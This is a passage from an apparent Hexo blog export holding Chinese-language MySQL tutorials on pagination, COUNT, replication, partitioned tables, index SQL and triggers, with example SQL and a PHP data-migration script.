<p>  <code>limit offset，N </code> 这是一个常见的问题<a href="https://www.v2ex.com/t/296130#reply36">https://www.v2ex.com/t/296130</a>，当offset非常大时， 效率极低，<br>  原因是 MySQL 并不是跳过 offset 行，然后单取 N 行，而是取 offset+N 行，返回放弃前 offset 行，返回N行。当offset越大时，效率越低，为了避免这种情况可以</p>
<ol>
<li><p>从业务上去解决，不允许翻过100页，以百度为例，一般只允许翻页到 70 页左右。</p>
</li>
<li><p>不用 offset， 用条件查询，如 <code>where id &gt; offset limit N</code><br>  ，这样做的缺陷是如果 id 缺失（某条记录被删除）将导致查询结果又偏差，但大数据量下的翻页牺牲一些准确度换取性能是可以的，如果非要准确度可以对数据进行逻辑删除而不是物理删除。</p>
</li>
<li><p>如果非要用 offset 可以使用延迟关联。</p>
<pre><code> # 先用索引查出 id
 select id from tableName limit 5000000，10
 # 在连接查询，完整 SQL 如下
 select * from tableName inner join (select id from tableName limit 5000000，10) as tmp using(id);
</code></pre>
</li>
</ol>
</li>
<li><p>COUNT 优化</p>
<p>  MyISAM 中对 count 进行了优化，count 统计时直接从表中读取值。</p>
<p>  <img src="/images/20170808/myisam.png"></p>
<p>  InnoDB 中的 count 使用索引统计</p>
<p>  <img src="/images/20170808/innodb.png"></p>
<p>  <strong>注意</strong>索引会被缓存到内存中，所以再次执行时比第一次快很多：</p>
<p>  <img src="/images/20170808/innodb-cache.png"></p>
<p>  尽量避免 where 条件的 count 特别是条件列中没有索引的时候查询会更加慢。</p>
</li>
</ul>
<h2 id="MySQL-集群优化策略"><a href="#MySQL-集群优化策略" class="headerlink" title="MySQL 集群优化策略"></a>MySQL 集群优化策略</h2><h3 id="读写分离优化策略"><a href="#读写分离优化策略" class="headerlink" title="读写分离优化策略"></a>读写分离优化策略</h3><p>典型问题:</p>
<p>有一业务场景，经过测试，读写比为1:20，请根据读写比，合理设置优化方案.<br>根据写数据&#x2F;读数据的比例，(Insert&#x2F;update&#x2F;delelte) &#x2F; (select)</p>
<p><img src="/images/20170808/read.png"></p>
<h3 id="主从复制"><a href="#主从复制" class="headerlink" title="主从复制"></a>主从复制</h3><p>实现步骤大概如下，具体请查阅官方文档：</p>
<ol>
<li><p>首先确保主服务器打开二进制日志功能。这样，主服务器一旦有数据变化,立即产生二进制日志。</p>
</li>
<li><p>从服务器也需要开启二进制日志和 relay 日志功能。这样可以从主服务器读取 binlog, 并产生 relaylog。</p>
</li>
<li><p>在主服务器建立一个从服务器的账号，并授予读 binlog 的权限。</p>
</li>
<li><p>指定从服务对应的主服务器，开启从服务器。</p>
</li>
</ol>
<h3 id="主主复制"><a href="#主主复制" class="headerlink" title="主主复制"></a>主主复制</h3><p>从服务器一是起到备份作用，二是起到分担查询压力的作用，如果一台服务器不足以承当写的压力可以配置多台服务器共同承担写任务，他们之间的数据可以相互复制，他们的关系是平等的。</p>
<p><img src="/images/20170808/master.png" alt="&#x2F;images&#x2F;20170808&#x2F;master.png"></p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
<li><p>燕十八《MySQL 优化》</p>
</li>
<li><p><a href="https://dev.mysql.com/doc/refman/5.5/en/index-btree-hash.html#btree-index-characteristics">https://dev.mysql.com/doc/refman/5.5/en/index-btree-hash.html#btree-index-characteristics</a></p>
</li>
<li><p><a href="http://www.cnblogs.com/aspnethot/articles/1504082.html">http://www.cnblogs.com/aspnethot/articles/1504082.html</a></p>
</li>
<li><p><a href="http://mysql.taobao.org/monthly/2017/02/05/">http://mysql.taobao.org/monthly/2017/02/05/</a></p>
</li>
<li><p><a href="http://blog.csdn.net/whzhaochao/article/details/49126037">http://blog.csdn.net/whzhaochao/article/details/49126037</a></p>
</li>
<li><p><a href="https://www.teakki.com/p/57e22e65a16367940da64470">https://www.teakki.com/p/57e22e65a16367940da64470</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Storage</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 特性之分区表</title>
    <url>/fundamental/storage/mysql-features-of-partition/</url>
    <content><![CDATA[<p>对于小量数据来讲，数据库的优化往往是建立高效的索引策略，最常用的索引类型是 B-Tree 索引。然而量变引起质变，在单表数据量较大时，B-Tree索引就无法起作用了。除非是索引覆盖查询，否则数据库服务器需要根据索引扫描的结果回表，查询所有符合条件的记录，如果数据量巨大，这将产生大量随机I&#x2F;O，随之，数据库的响应时间将大到不可接受的程度。另外，索引维护（磁盘空间、I&#x2F;O操作）的代价也非常高。</p>
<span id="more"></span>

<h2 id="分表与分区"><a href="#分表与分区" class="headerlink" title="分表与分区"></a>分表与分区</h2><h3 id="分表"><a href="#分表" class="headerlink" title="分表"></a>分表</h3><p>分表又可分为垂直分表和水平分表。</p>
<h4 id="垂直分表"><a href="#垂直分表" class="headerlink" title="垂直分表"></a>垂直分表</h4><p><strong>原因：</strong></p>
<p>1.对于 <code>InnoDB</code>引擎来讲，主索引叶子节点存储着当前行的所有信息，所以减少字段可使内存加载更多行数据，有利于查询。</p>
<p>2.受限于操作系统中的文件大小限制。</p>
<p><strong>切分原则：</strong> 把不常用或业务逻辑不紧密或存储内容比较多的字段分到新的表中可使表存储更多数据。</p>
<h4 id="水平分表："><a href="#水平分表：" class="headerlink" title="水平分表："></a>水平分表：</h4><p><strong>原因：</strong></p>
<p>1.随着数据量的增大，行数巨大，索引失效，查询的效率越来越低。</p>
<p>2.同样受限于操作系统中的文件大小限制，数据量不能无限增加，当到达一定容量时，需要水平切分以降低单表（文件）的大小。</p>
<p><strong>切分原则：</strong> 增量区间或散列或其他业务逻辑。</p>
<p>使用哪种切分方法要根据实际业务逻辑判断。比如对表中有时间字段，就可以根据时间区间分表。</p>
<p>如果对表的访问较均匀，没有明显的热点区域，则可以考虑用范围（比如每500w一个表）或普通 Hash 或一致性Hash来切分。</p>
<h3 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h3><p>　在日常的工作中，我们经常遇到一张表里面保存了上亿甚至过十亿的记录。这些表里面保存了大量的历史记录，并且对历史数据的访问较少，有明显的冷热区分，由于数据量剧增会导致热点数据查询效率降低，当想清除无效的历史数据时，因为清楚数据量较大会使得锁表时间变长，对数据库的造成了很大压力。即使把这些无效数据删除了，底层的数据文件并没有变小。面对这类问题，最有效的方法就是在使用分区表。最常见的分区方法就是按照时间进行分区。 分区的优点是可以解决大数据量下的慢查询，也可以非常高效的进行历史数据的清理。</p>
<p>分区功能并不是在存储引擎层完成的，因此不只有 InnoDB 存储引擎支持分区，常见的存储引擎MyISAM、NDB等都支持分区。但是并不是所有的存储引擎都支持，如 CSV、FEDORATED、MERGE 等就不支持分区。在使用此分区功能前，应该对选择的存储引擎对分区的支持有所了解。</p>
<p>可以通过使用SHOW VARIABLES 命令来确定 MySQL 是否支持分区，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; SHOW VARIABLES LIKE &#x27;%partition%&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="分区表冷热数据分离实践"><a href="#分区表冷热数据分离实践" class="headerlink" title="分区表冷热数据分离实践"></a>分区表冷热数据分离实践</h2><p>业务场景</p>
<p>某订单表中冷热数据区分明显，现将历史数据迁移到一张新的历史表中，历史表属分区表。</p>
<h3 id="建表"><a href="#建表" class="headerlink" title="建表"></a>建表</h3><p>热点表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> `t_hot` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span> ,</span><br><span class="line">  `<span class="type">date</span>` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">    <span class="comment">-- omitted other column</span></span><br><span class="line">  `last_update` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  KEY `IX_DCCC` (`<span class="type">date</span>`,`col_1`,`col_2`,`col_3`)</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br></pre></td></tr></table></figure>

<p>历史表</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> `t_history` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span> ,</span><br><span class="line">  `<span class="type">date</span>` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  <span class="comment">-- omitted other column</span></span><br><span class="line">  `last_update` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">) ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8 <span class="keyword">PARTITION</span>  <span class="keyword">BY</span> <span class="keyword">RANGE</span>(TO_DAYS(`<span class="type">date</span>`)) (</span><br><span class="line">    <span class="keyword">PARTITION</span> p_defalut <span class="keyword">VALUES</span> LESS THAN (MAXVALUE)</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h3 id="数据迁移"><a href="#数据迁移" class="headerlink" title="数据迁移"></a>数据迁移</h3><p>使用脚本将热点数据迁移到历史表中，迁移过程如下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">moveGeData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="comment">// 如果表不存在，则建表</span></span><br><span class="line">	... omitted ...</span><br><span class="line">    <span class="comment">// 一月新增一个分区</span></span><br><span class="line">    <span class="variable">$month_ago</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d&#x27;</span>,<span class="title function_ invoke__">time</span>() - <span class="number">1</span> * <span class="number">30</span> * <span class="number">24</span> * <span class="number">60</span> * <span class="number">60</span>);</span><br><span class="line">    <span class="variable">$ym</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;ym&#x27;</span>,(<span class="title function_ invoke__">strtotime</span>(<span class="variable">$six_months_ago</span>)-<span class="number">1</span>));</span><br><span class="line">    <span class="variable">$partition</span> = <span class="string">&quot;ALTER TABLE t_history REORGANIZE PARTITION pmax INTO (PARTITION p<span class="subst">&#123;$ym&#125;</span> VALUES LESS THAN (TO_DAYS(&#x27;<span class="subst">&#123;$month_ago&#125;</span>&#x27;)),PARTITION pmax VALUES LESS THAN MAXVALUE)&quot;</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$partition</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;add partition:<span class="subst">$partition</span>\n&quot;</span>;</span><br><span class="line">    <span class="comment">// 迁移</span></span><br><span class="line">    <span class="variable">$sql_insert</span> = <span class="string">&quot;insert into t_history select * from t_hot where date &lt;= &#x27;<span class="subst">$month_ago</span>&#x27;;&quot;</span>;</span><br><span class="line">    <span class="variable">$ret</span> =  <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql_insert</span>)-&gt;<span class="title function_ invoke__">affect_rows</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql_del</span> = <span class="string">&quot;delete from t_hot where date &lt;= &#x27;<span class="subst">$month_ago</span>&#x27; limit &quot;</span>.<span class="variable">$ret</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql_del</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[Done &quot;</span>.<span class="title function_ invoke__">date</span>(<span class="string">&quot;h:i:s&quot;</span>).<span class="string">&quot;]\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://xieminis.me/?p=216">http://xieminis.me/?p=216</a></p>
<p><a href="http://www.cnblogs.com/tinywan/p/6625432.html">http://www.cnblogs.com/tinywan/p/6625432.html</a></p>
<p><a href="https://www.awaimai.com/371.html">https://www.awaimai.com/371.html</a></p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Storage</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>分区表</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 索引相关 SQL</title>
    <url>/fundamental/storage/mysql-sql-about-index/</url>
    <content><![CDATA[<h2 id="创建索引"><a href="#创建索引" class="headerlink" title="创建索引"></a>创建索引</h2><h4 id="1．ALTER-TABLE"><a href="#1．ALTER-TABLE" class="headerlink" title="1．ALTER TABLE"></a>1．ALTER TABLE</h4><p>ALTER TABLE用来创建普通索引、UNIQUE索引或PRIMARY KEY索引。</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">ALTER TABLE</span> table_name <span class="keyword">ADD</span> INDEX IDX_ABC (a,b,c) USEING BTREE</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER TABLE</span> table_name <span class="keyword">ADD</span> <span class="keyword">UNIQUE</span> (column_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER TABLE</span> table_name <span class="keyword">ADD</span> <span class="keyword">PRIMARY KEY</span> (column_list)</span><br></pre></td></tr></table></figure>



<p>其中 <code>table_name</code> 是要增加索引的表名，<code>column_list</code>指出对哪些列进行索引，多列时各列之间用逗号分隔。索引名<code>index_name</code>可选，缺省时，MySQL 将根据第一个索引列赋一个名称。另外，<code>ALTER TABLE</code> 允许在单个语句中更改多个表，因此可以在同时创建多个索引。<code>USEING BTREE </code> 表示索引使用的数据结构为 B 树。</p>
<span id="more"></span>

<h4 id="2．CREATE-INDEX"><a href="#2．CREATE-INDEX" class="headerlink" title="2．CREATE INDEX"></a>2．CREATE INDEX</h4><p>CREATE INDEX 可对表增加普通索引或 UNIQUE 索引。</p>
 <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> INDEX index_name <span class="keyword">ON</span> table_name (column_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">UNIQUE</span> INDEX index_name <span class="keyword">ON</span> table_name (column_list)</span><br></pre></td></tr></table></figure>

<p>table_name、index_name 和column_list 具有与ALTER TABLE语句中相同的含义，索引名不可选。另外，不能用CREATE INDEX语句创建PRIMARY KEY索引。</p>
<h2 id="查看索引"><a href="#查看索引" class="headerlink" title="查看索引"></a>查看索引</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span> INDEX <span class="keyword">FROM</span> tblname;</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SHOW</span>  KEYS <span class="keyword">FROM</span> tblname;</span><br></pre></td></tr></table></figure>

<p><img src="/images/20180119/show_index.png"></p>
<p>　　</p>
<table>
<thead>
<tr>
<th align="center">Name</th>
<th align="left">Description</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Table</td>
<td align="left">表的名称</td>
</tr>
<tr>
<td align="center">Non_unique</td>
<td align="left">如果索引不能包括重复词，则为0。如果可以，则为1。</td>
</tr>
<tr>
<td align="center">Key_name</td>
<td align="left">索引的名称</td>
</tr>
<tr>
<td align="center">Seq_in_index</td>
<td align="left">索引中的列序列号，从1开始。</td>
</tr>
<tr>
<td align="center">Column_name</td>
<td align="left">建索引的列名称</td>
</tr>
<tr>
<td align="center">Collation</td>
<td align="left">列以什么方式存储在索引中。在 MySQL 中，有值  A 升序）或 NULL（无分类）。</td>
</tr>
<tr>
<td align="center">Cardinality</td>
<td align="left">索引中唯一值的数目的估计值。通过运行ANALYZE TABLE或 myisamchk -a 可以更新。基数根据被存储为整数的统计数据来计数，所以即使对于小型表，该值也没有必要是精确的。基数越大，当进行联合时，MySQL使用该索引的机会就越大。</td>
</tr>
<tr>
<td align="center">Sub_part</td>
<td align="left">如果列只是被部分地编入索引，则为被编入索引的字符的数目。如果整列被编入索引，则为NULL</td>
</tr>
<tr>
<td align="center">Packed</td>
<td align="left">指示关键字如何被压缩。如果没有被压缩，则为NULL。</td>
</tr>
<tr>
<td align="center">Null</td>
<td align="left">如果列含有NULL，则含有YES。如果没有，则该列含有NO。</td>
</tr>
<tr>
<td align="center">Index_type</td>
<td align="left">过的索引方法（BTREE, FULLTEXT, HASH, RTREE）</td>
</tr>
<tr>
<td align="center">Comment</td>
<td align="left">注释</td>
</tr>
</tbody></table>
<h2 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h2><p>可利用 ALTER TABLE 或 DROP INDEX 语句来删除索引。类似于 CREATE INDEX 语句，DROP INDEX可以在ALTER TABLE内部作为一条语句处理，语法如下。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> INDEX index_name <span class="keyword">ON</span> talbe_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER TABLE</span> table_name <span class="keyword">DROP</span> INDEX index_name</span><br><span class="line"></span><br><span class="line"><span class="keyword">ALTER TABLE</span> table_name <span class="keyword">DROP</span> <span class="keyword">PRIMARY KEY</span></span><br></pre></td></tr></table></figure>



<p>其中，前两条语句是等价的，删除掉table_name中的索引index_name。</p>
<p>第3条语句只在删除PRIMARY KEY索引时使用，因为一个表只可能有一个PRIMARY KEY索引，因此不需要指定索引名。如果没有创建PRIMARY KEY索引，但表具有一个或多个UNIQUE索引，则MySQL将删除第一个UNIQUE索引。如果从表中删除了某列，则索引会受到影响。对于多列组合的索引，如果删除其中的某列，则该列也会从索引中删除。如果删除组成索引的所有列，则整个索引将被删除。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a href="https://stackoverflow.com/questions/10259504/delimiters-in-mysql">https://stackoverflow.com/questions/10259504/delimiters-in-mysql</a></li>
<li><a href="https://stackoverflow.com/questions/4205181/insert-into-a-mysql-table-or-update-if-exists">https://stackoverflow.com/questions/4205181/insert-into-a-mysql-table-or-update-if-exists</a></li>
</ul>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Storage</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL 触发器相关的 SQL</title>
    <url>/fundamental/storage/mysql-sql-about-trigger/</url>
    <content><![CDATA[<p><strong>触发器</strong>（英语：trigger）是在数据库中，在执行对数据有异动的动作时，先行拦截并处理的一种数据库对象，它大部分会设在数据表中，作为强制运行特定动作的程序，因此又称为<a href="https://zh.wikipedia.org/wiki/%E6%95%B0%E6%8D%AE%E6%93%8D%E7%BA%B5%E8%AF%AD%E8%A8%80">数据操纵语言</a>(DML)触发器。</p>
<h3 id="创建触发器"><a href="#创建触发器" class="headerlink" title="创建触发器"></a>创建触发器</h3><p>在MySQL中，创建触发器语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> trigger_name</span><br><span class="line">trigger_time</span><br><span class="line">trigger_event <span class="keyword">ON</span> tbl_name</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line">trigger_stmt</span><br></pre></td></tr></table></figure>

<p>其中：</p>
<p>trigger_name：标识触发器名称，用户自行指定；<br>trigger_time：标识触发时机，取值为 BEFORE 或 AFTER；<br>trigger_event：标识触发事件，取值为 INSERT、UPDATE 或 DELETE；<br>tbl_name：标识建立触发器的表名，即在哪张表上建立触发器；<br>trigger_stmt：触发器程序体，可以是一句SQL语句，或者用 BEGIN 和 END 包含的多条语句。</p>
<span id="more"></span>

<p>由此可见，可以建立6种触发器，即：BEFORE INSERT、BEFORE UPDATE、BEFORE DELETE、AFTER INSERT、AFTER UPDATE、AFTER DELETE。</p>
<p>另外有一个限制是不能同时在一个表上建立2个相同类型的触发器，因此在一个表上最多建立6个触发器。</p>
<h3 id="trigger-event-详解"><a href="#trigger-event-详解" class="headerlink" title="trigger_event 详解"></a>trigger_event 详解</h3><p>MySQL 除了对 INSERT、UPDATE、DELETE 基本操作进行定义外，还定义了 LOAD DATA 和 REPLACE 语句，这两种语句也能引起上述6中类型的触发器的触发。</p>
<p>LOAD DATA 语句用于将一个文件装入到一个数据表中，相当与一系列的 INSERT 操作。</p>
<p>REPLACE 语句一般来说和 INSERT 语句很像，只是在表中有 primary key 或 unique 索引时，如果插入的数据和原来 primary key 或 unique 索引一致时，会先删除原来的数据，然后增加一条新数据，也就是说，一条 REPLACE 语句有时候等价于一条。</p>
<p>INSERT 语句，有时候等价于一条 DELETE 语句加上一条 INSERT 语句。</p>
<p>INSERT 型触发器：插入某一行时激活触发器，可能通过 INSERT、LOAD DATA、REPLACE 语句触发；<br>UPDATE 型触发器：更改某一行时激活触发器，可能通过 UPDATE 语句触发；<br>DELETE 型触发器：删除某一行时激活触发器，可能通过 DELETE、REPLACE 语句触发。</p>
<h3 id="BEGIN-…-END-详解"><a href="#BEGIN-…-END-详解" class="headerlink" title="BEGIN … END 详解"></a>BEGIN … END 详解</h3><p>在MySQL中，BEGIN … END 语句的语法为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line">[statement_list]</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>

<p>其中，statement_list 代表一个或多个语句的列表，列表内的每条语句都必须用分号（;）来结尾。<br>而在MySQL中，分号是语句结束的标识符，遇到分号表示该段语句已经结束，MySQL可以开始执行了。因此，解释器遇到statement_list 中的分号后就开始执行，然后会报出错误，因为没有找到和 BEGIN 匹配的 END。</p>
<p>这时就会用到 DELIMITER 命令（DELIMITER 是定界符，分隔符的意思），它是一条命令，不需要语句结束标识，语法为：<br>DELIMITER new_delemiter<br>new_delemiter 可以设为1个或多个长度的符号，默认的是分号（;），我们可以把它修改为其他符号，如$：<br>DELIMITER $<br>在这之后的语句，以分号结束，解释器不会有什么反应，只有遇到了$，才认为是语句结束。注意，使用完之后，我们还应该记得把它给修改回来。</p>
<h3 id="一个完整的创建触发器示例"><a href="#一个完整的创建触发器示例" class="headerlink" title="一个完整的创建触发器示例"></a>一个完整的创建触发器示例</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"># 新增 business 表时往 business_name 表中查数据</span><br><span class="line"><span class="keyword">CREATE TABLE</span> `business` (</span><br><span class="line">  `id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">NOT NULL</span> AUTO_INCREMENT,</span><br><span class="line">  `business_id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `business_name` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `create_time` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `last_update` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`id`)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># business_name</span><br><span class="line"><span class="keyword">CREATE TABLE</span> `business_name` (</span><br><span class="line">  `business_id` <span class="type">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> ,</span><br><span class="line">  `business_name` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT,</span><br><span class="line">  `create_time` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `modified_name` <span class="type">varchar</span>(<span class="number">100</span>) <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span> COMMENT,</span><br><span class="line">  `modified_time` <span class="type">date</span> <span class="keyword">DEFAULT</span> <span class="keyword">NULL</span>,</span><br><span class="line">  `last_update` <span class="type">timestamp</span> <span class="keyword">NOT NULL</span> <span class="keyword">DEFAULT</span> <span class="built_in">CURRENT_TIMESTAMP</span> <span class="keyword">ON</span> <span class="keyword">UPDATE</span> <span class="built_in">CURRENT_TIMESTAMP</span>,</span><br><span class="line">  <span class="keyword">PRIMARY KEY</span> (`business_id`)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 修改分隔符</span><br><span class="line">DELIMITER $$</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> auto_update_busi_name</span><br><span class="line">AFTER <span class="keyword">INSERT</span> </span><br><span class="line"><span class="keyword">ON</span> business</span><br><span class="line"><span class="keyword">FOR</span> <span class="keyword">EACH</span> <span class="type">ROW</span></span><br><span class="line"><span class="keyword">BEGIN</span></span><br><span class="line"><span class="keyword">INSERT INTO</span> business_name(business_id,business_name,create_time,modified_name) VALUSE(new.business_id,new.business_name,new.create_time,new.business_name) <span class="keyword">ON</span> DUPLICATE KEY <span class="keyword">UPDATE</span> business_id<span class="operator">=</span>new.business_id,business_name<span class="operator">=</span>new.business_name,create_time<span class="operator">=</span>new.create_time;</span><br><span class="line"><span class="keyword">end</span>$$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DELIMITER ;</span><br></pre></td></tr></table></figure>



<h3 id="变量详解"><a href="#变量详解" class="headerlink" title="变量详解"></a>变量详解</h3><p>MySQL 中使用 DECLARE 来定义一局部变量，该变量只能在 BEGIN … END 复合语句中使用，并且应该定义在复合语句的开头，</p>
<p>即其它语句之前，语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DECLARE</span> var_name[,...] type [<span class="keyword">DEFAULT</span> <span class="keyword">value</span>]</span><br></pre></td></tr></table></figure>

<p>其中：<br>var_name 为变量名称，同 SQL 语句一样，变量名不区分大小写；type 为 MySQL 支持的任何数据类型；可以同时定义多个同类型的变量，用逗号隔开；变量初始值为 NULL，如果需要，可以使用 DEFAULT 子句提供默认值，值可以被指定为一个表达式。</p>
<p>对变量赋值采用 SET 语句，语法为：**</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SET</span> var_name <span class="operator">=</span> expr [,var_name <span class="operator">=</span> expr] ...</span><br></pre></td></tr></table></figure>

<h3 id="NEW-与-OLD-详解"><a href="#NEW-与-OLD-详解" class="headerlink" title="NEW 与 OLD 详解"></a>NEW 与 OLD 详解</h3><p>触发器的所在表中，触发了触发器的那一行数据。<br>具体地：<br>在 INSERT 型触发器中，NEW 用来表示将要（BEFORE）或已经（AFTER）插入的新数据；<br>在 UPDATE 型触发器中，OLD 用来表示将要或已经被修改的原数据，NEW 用来表示将要或已经修改为的新数据；<br>在 DELETE 型触发器中，OLD 用来表示将要或已经被删除的原数据；<br>使用方法： NEW.columnName （columnName 为相应数据表某一列名）<br>另外，OLD 是只读的，而 NEW 则可以在触发器中使用 SET 赋值，这样不会再次触发触发器，造成循环调用（如每插入一个学生前，都在其学号前加“2013”）。</p>
<h3 id="查看触发器"><a href="#查看触发器" class="headerlink" title="查看触发器"></a>查看触发器</h3><p>和查看数据库（show databases;）查看表格（show tables;）一样，查看触发器的语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> TRIGGERS [<span class="keyword">FROM</span> schema_name];</span><br></pre></td></tr></table></figure>

<p>其中，schema_name 即 Schema 的名称，在 MySQL 中 Schema 和 Database 是一样的，也就是说，可以指定数据库名，这样就</p>
<p>不必先“USE database_name;”了。</p>
<h3 id="删除触发器"><a href="#删除触发器" class="headerlink" title="删除触发器"></a>删除触发器</h3><p>和删除数据库、删除表格一样，删除触发器的语法如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> [IF <span class="keyword">EXISTS</span>] [schema_name.]trigger_name</span><br></pre></td></tr></table></figure>

<h3 id="触发器的执行顺序"><a href="#触发器的执行顺序" class="headerlink" title="触发器的执行顺序"></a>触发器的执行顺序</h3><p>我们建立的数据库一般都是 InnoDB 数据库，其上建立的表是事务性表，也就是事务安全的。这时，若SQL语句或触发器执行失败，MySQL 会回滚事务，有：</p>
<p>①如果 BEFORE 触发器执行失败，SQL 无法正确执行。<br>②SQL 执行失败时，AFTER 型触发器不会触发。<br>③AFTER 类型的触发器执行失败，SQL 会回滚。</p>
]]></content>
      <categories>
        <category>Fundamental</category>
        <category>Storage</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows 10 配合 Ubuntu 搭建舒适开发环境不完全指北</title>
    <url>/experience/guide/dev-environment-on-windows-and-linux/</url>
